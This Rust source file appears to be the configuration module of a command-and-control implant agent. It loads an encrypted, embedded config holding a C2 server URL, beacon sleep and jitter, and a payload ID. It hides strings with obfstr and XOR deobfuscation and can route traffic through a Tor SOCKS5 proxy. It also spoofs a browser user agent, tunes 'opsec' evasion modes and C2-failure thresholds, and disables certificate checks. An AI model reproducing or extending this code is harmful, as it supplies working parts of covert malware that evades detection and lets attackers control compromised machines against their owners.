use serde::{Deserialize, Serialize};
use std::fs;
use std::io;
use std::path::Path;
use std::env;
use log::{info, warn, error};
use reqwest::{Client, Proxy};
use obfstr::obfstr;

// --- AES Decryption Logic ---
#[cfg(feature = "encryption-aes")]
fn decrypt_config(encrypted_data: &[u8], key_str: &str) -> Result<String, String> {
    use aes_gcm::aead::{Aead, KeyInit};
    use aes_gcm::{Aes256Gcm, Key, Nonce};

    if encrypted_data.len() < 12 {
        return Err("Encrypted data too short".to_string());
    }
    let (nonce_bytes, ciphertext) = encrypted_data.split_at(12);
    let nonce = Nonce::from_slice(nonce_bytes);

    let mut key_material = [0u8; 32];
    let key_bytes = key_str.as_bytes();
    let len = key_bytes.len().min(32);
    key_material[..len].copy_from_slice(&key_bytes[..len]);
    let key = Key::<Aes256Gcm>::from_slice(&key_material);

    let cipher = Aes256Gcm::new(key);
    let decrypted_bytes = cipher.decrypt(nonce, ciphertext)
        .map_err(|e| format!("AES decrypt failed: {}", e))?;
    String::from_utf8(decrypted_bytes).map_err(|e| e.to_string())
}

// --- ChaCha20 Decryption Logic ---
#[cfg(feature = "encryption-chacha")]
fn decrypt_config(encrypted_data: &[u8], key_str: &str) -> Result<String, String> {
    use chacha20poly1305::aead::{Aead, KeyInit};
    use chacha20poly1305::{ChaCha20Poly1305, Key, Nonce};

    if encrypted_data.len() < 12 {
        return Err("Encrypted data too short".to_string());
    }
    let (nonce_bytes, ciphertext) = encrypted_data.split_at(12);
    let nonce = Nonce::from_slice(nonce_bytes);

    let mut key_material = [0u8; 32];
    let key_bytes = key_str.as_bytes();
    let len = key_bytes.len().min(32);
    key_material[..len].copy_from_slice(&key_bytes[..len]);
    let key = Key::from_slice(&key_material);

    let cipher = ChaCha20Poly1305::new(key);
    let decrypted_bytes = cipher.decrypt(nonce, ciphertext)
        .map_err(|e| format!("ChaCha20 decrypt failed: {}", e))?;
    String::from_utf8(decrypted_bytes).map_err(|e| e.to_string())
}

// Include the generated config file
include!(concat!(env!("OUT_DIR"), "/config.rs"));

// Helper function to deobfuscate the config
fn deobfuscate_config(hex_content: &str, key_str: &str) -> Result<String, String> {
    let key_bytes = key_str.as_bytes();
    let mut obfuscated_bytes = Vec::new();
    for i in (0..hex_content.len()).step_by(2) {
        let byte_str = hex_content.get(i..i+2).ok_or_else(|| "Invalid hex string length".to_string())?;
        let byte = u8::from_str_radix(byte_str, 16).map_err(|e| format!("Invalid hex character: {}", e))?;
        obfuscated_bytes.push(byte);
    }

    for (i, byte) in obfuscated_bytes.iter_mut().enumerate() {
        *byte ^= key_bytes[i % key_bytes.len()];
    }
    String::from_utf8(obfuscated_bytes).map_err(|e| format!("Deobfuscated config is not valid UTF-8: {}", e))
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct AgentConfig {
    pub server_url: String,
    pub sleep_interval: u64,
    pub jitter: u64,
    pub payload_id: String,
    pub protocol: String,
    #[serde(default)]
    pub socks5_enabled: bool,
    #[serde(default = "default_socks5_host")]
    pub socks5_host: String,
    #[serde(default = "default_socks5_port")]
    pub socks5_port: u16,
    #[serde(default = "default_proc_scan_interval")]
    pub proc_scan_interval_secs: u64,
    #[serde(default = "default_user_agent")]
    pub user_agent: String,
    #[serde(default = "default_base_score_threshold_bg_to_reduced")]
    pub base_score_threshold_bg_to_reduced: f32,
    #[serde(default = "default_base_score_threshold_reduced_to_full")]
    pub base_score_threshold_reduced_to_full: f32,
    #[serde(default = "default_min_duration_full_opsec")]
    pub min_duration_full_opsec_secs: u64,
    #[serde(default = "default_min_duration_background_opsec")]
    pub min_duration_background_opsec_secs: u64,
    #[serde(default = "default_base_max_consecutive_c2_failures")]
    pub base_max_consecutive_c2_failures: u32,
    #[serde(default = "default_min_duration_reduced_activity_secs")]
    pub min_duration_reduced_activity_secs: u64,
    #[serde(default = "default_reduced_activity_sleep_secs")]
    pub reduced_activity_sleep_secs: u64,
    #[serde(default = "default_c2_failure_threshold_increase_factor")]
    pub c2_failure_threshold_increase_factor: f32,
    #[serde(default = "default_c2_failure_threshold_decrease_factor")]
    pub c2_failure_threshold_decrease_factor: f32,
    #[serde(default = "default_c2_threshold_adjust_interval_secs")]
    pub c2_threshold_adjust_interval_secs: u64,
    #[serde(default = "default_c2_dynamic_threshold_max_multiplier")]
    pub c2_dynamic_threshold_max_multiplier: f32,
}

fn default_socks5_host() -> String {
    obfstr!("127.0.0.1").to_string()
}

fn default_socks5_port() -> u16 {
    9050
}

fn default_proc_scan_interval() -> u64 { 300 }

fn default_user_agent() -> String {
    // Use a common browser user agent as default
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36".to_string()
}

fn default_base_score_threshold_bg_to_reduced() -> f32 {
    20.0
}

fn default_base_score_threshold_reduced_to_full() -> f32 {
    60.0
}

fn default_min_duration_full_opsec() -> u64 {
    300 // Default 5 minutes in FullOpsec
}

fn default_min_duration_background_opsec() -> u64 {
    60 // Default 1 minute in BackgroundOpsec
}

fn default_base_max_consecutive_c2_failures() -> u32 {
    5 // Default: trigger signal after 5 consecutive failures
}

fn default_min_duration_reduced_activity_secs() -> u64 {
    120 // Default 2 minutes in ReducedActivity
}

fn default_reduced_activity_sleep_secs() -> u64 {
    120 // Default 2 minutes sleep for ReducedActivity
}

fn default_c2_failure_threshold_increase_factor() -> f32 {
    1.0 // Default: No increase
}

fn default_c2_failure_threshold_decrease_factor() -> f32 {
    1.0 // Default: No decrease
}

fn default_c2_threshold_adjust_interval_secs() -> u64 {
    u64::MAX // Default: Effectively disable periodic adjustment
}

fn default_c2_dynamic_threshold_max_multiplier() -> f32 {
    1.0 // Default: Dynamic threshold cannot exceed base threshold
}

impl Default for AgentConfig {
    fn default() -> Self {
        Self {
            server_url: String::new(),
            sleep_interval: 5,
            jitter: 2,
            payload_id: String::new(),
            protocol: obfstr!("http").to_string(),
            socks5_enabled: false,
            socks5_host: obfstr!("127.0.0.1").to_string(),
            socks5_port: 9050,
            proc_scan_interval_secs: default_proc_scan_interval(),
            user_agent: default_user_agent(),
            base_score_threshold_bg_to_reduced: default_base_score_threshold_bg_to_reduced(),
            base_score_threshold_reduced_to_full: default_base_score_threshold_reduced_to_full(),
            min_duration_full_opsec_secs: default_min_duration_full_opsec(),
            min_duration_background_opsec_secs: default_min_duration_background_opsec(),
            base_max_consecutive_c2_failures: default_base_max_consecutive_c2_failures(),
            min_duration_reduced_activity_secs: default_min_duration_reduced_activity_secs(),
            reduced_activity_sleep_secs: default_reduced_activity_sleep_secs(),
            c2_failure_threshold_increase_factor: default_c2_failure_threshold_increase_factor(),
            c2_failure_threshold_decrease_factor: default_c2_failure_threshold_decrease_factor(),
            c2_threshold_adjust_interval_secs: default_c2_threshold_adjust_interval_secs(),
            c2_dynamic_threshold_max_multiplier: default_c2_dynamic_threshold_max_multiplier(),
        }
    }
}

// The AgentConfig struct is used to load and manage the agent's configuration.
impl AgentConfig {
    pub fn load() -> io::Result<Self> {
        // Primary method: Load from embedded, encrypted config
        match decrypt_config(ENCRYPTED_CONFIG, CONFIG_KEY) {
            Ok(json_config) => {
                info!("[CONFIG] Successfully decrypted and loaded embedded configuration.");
                if let Ok(config) = serde_json::from_str::<AgentConfig>(&json_config) {
                     return Ok(config);
                }
            }
            Err(e) => {
                error!("[CONFIG] FAILED to decrypt embedded config: {}. Falling back.", e);
            }
        }

        // Fallback: Load from config.json in the same directory as the executable
        if let Ok(mut exe_path) = env::current_exe() {
            exe_path.pop();
            let config_path = exe_path.join(".config/config.json");
            if let Ok(contents) = fs::read_to_string(config_path) {
                if let Ok(config) = serde_json::from_str(&contents) {
                    warn!("[CONFIG] Loaded configuration from filesystem as a fallback.");
                    return Ok(config);
                }
            }
        }

        Err(io::Error::new(io::ErrorKind::NotFound, "No valid configuration found"))
    }

    pub fn get_server_url(&self) -> String {
        if self.server_url.starts_with("http://") || self.server_url.starts_with("https://") {
            self.server_url.clone()
        } else {
            format!("{}://{}", self.protocol, self.server_url)
        }
    }

    /// Build an HTTP client that respects the SOCKS5 proxy config and logs the proxy status.
    pub fn build_http_client(&self) -> Result<Client, io::Error> {
        let builder = Client::builder()
            .user_agent(self.user_agent.clone())
            .danger_accept_invalid_certs(true);

        if self.socks5_enabled {
            let proxy_url = format!("socks5h://{}:{}", self.socks5_host, self.socks5_port);
            info!("[HTTP] Building HTTP client with SOCKS5 proxy: {}", proxy_url);
            match builder
                .proxy(Proxy::all(&proxy_url).map_err(|e| {
                    error!("[HTTP] Invalid proxy URL: {}", e);
                    io::Error::new(io::ErrorKind::Other, format!("Invalid proxy URL: {}", e))
                })?)
                .build() {
                Ok(client) => Ok(client),
                Err(e) => {
                    error!("[HTTP] Failed to build HTTP client with SOCKS5 proxy: {}", e);
                    Err(io::Error::new(io::ErrorKind::Other, format!("Failed to build HTTP client with proxy: {}", e)))
                }
            }
        } else {
            info!("[HTTP] Building HTTP client with direct connection (no proxy)");
            builder
                .build()
                .map_err(|e| io::Error::new(io::ErrorKind::Other, e))
        }
    }
}
